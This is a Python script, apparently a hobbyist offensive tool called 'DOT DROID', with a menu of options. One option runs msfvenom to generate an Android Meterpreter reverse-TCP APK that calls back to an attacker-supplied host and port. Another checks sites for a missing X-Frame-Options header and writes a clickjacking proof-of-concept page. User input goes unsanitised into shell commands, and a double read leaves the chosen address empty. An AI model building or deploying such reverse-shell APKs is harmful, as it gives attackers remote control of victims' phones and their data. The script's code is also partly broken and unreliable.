import pyfiglet
import os
import socket
from urllib.request import urlopen
from sys import argv, exit
import psutil
import whois

ascii_banner = pyfiglet.figlet_format("DOT DROID")
print(ascii_banner)
def create_payload(b, e):
    print(b)
    print(e)
    home_path = os.path.expanduser('~')
    directory = "Android_Shell_Apk"
    path = os.path.join(home_path, directory)
    dir_check = os.path.isdir(path)
    if dir_check != True:
        os.mkdir(path)
    create_payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + b + " LPORT="+ str(e) +" R > "+ path +"/my_shell.apk"
    payload = os.popen(create_payload)
    print(payload.read())
    print("Payload Created")

def exploit():
    print("We are working on it")

def check(url):
    print("IP Address: " + socket.gethostbyname(url))
    w = whois.whois(url)
    print("Organization", w.organization)
    print("Registrar", w.registrar)
    print("Creation Date", w.creation_date)
    print("Expiration Date", w.expiration_date)
    print("State", w.state)
    try:
        if "http" not in url: url = "http://" + url
        data = urlopen(url)
        headers = data.info()
        if not "X-Frame-Options" in headers: return True
    except: return False

def create_poc(url):
    code = """
<html>
   <head><title>Clickjack test page</title></head>
   <body>
     <p>Website is vulnerable to clickjacking!</p>
     <iframe src="http://{}" width="500" height="500"></iframe>
   </body>
</html>
    """.format(url)

    with open(url + ".html", "w") as f:
        f.write(code)
        f.close()

print("1. Create Payload \n2. Exploit Payload \n3. Click Jacking Test")
a = int(input("Choose the Option: "))
if a == 1:
    print("1. Choose automatically \n2. I given IP Adrress")
    x = int(input("Choose the Option: "))
    if x == 1:
        addrs = psutil.net_if_addrs()
        count = 1
        for key in addrs.keys():
            if count == 1:
                key1 = key
                print(str(count) + ": " + key1)
            elif count == 2:
                key2 = key
                print(str(count) + ": " + key2)
            elif count == 3:
                key3 = key
                print(str(count) + ": " + key3)
            elif count == 4:
                key4 = key
                print(str(count) + ": " + key4)
            else:
                print("Please enter 5 to give manually")
            count += 1
        interface_inp = int(input("Select your Interface: "))
        if interface_inp == 1:
            c = os.popen('ifdata -pa '+ key1 +' | tr -d "\n"')
            print(c.read())
        elif interface_inp == 2:
            c = os.popen('ifdata -pa '+ key2 +' | tr -d "\n"')
            print(c.read())
        elif interface_inp == 3:
            c = os.popen('ifdata -pa '+ key3 +' | tr -d "\n"')
            print(c.read())
        elif interface_inp == 4:
            c = os.popen('ifdata -pa '+ key4 +' | tr -d "\n"')
            print(c.read())
        elif interface_inp == 5:
            key5 = input("Enter your interface name: ")
            c = os.popen('ifdata -pa '+ key5 +' | tr -d "\n"')
            print(c.read())
        
        d = c.read()
        e = int(input("Please enter LPORT number: "))
        create_payload(d, e)
    if x == 2:
        b = input("Please Enter your LHOST: ")
        e = int(input("Please enter LPORT number: "))
        create_payload(b, e)

if a == 2:
    exploit()

if a == 3:
    url = input("Please Enter URL: ")
    status = check(url)
    if status:
        print("Website is vulnerable!")
        g = input("Are you need to generate payload(y/n): ")
        if g == "y":
            create_poc(url)
            print("PoC stored in your work directory")
        else:
            print("Thanks For Using our script")
    else:
        print("Website is not vulnerable!")
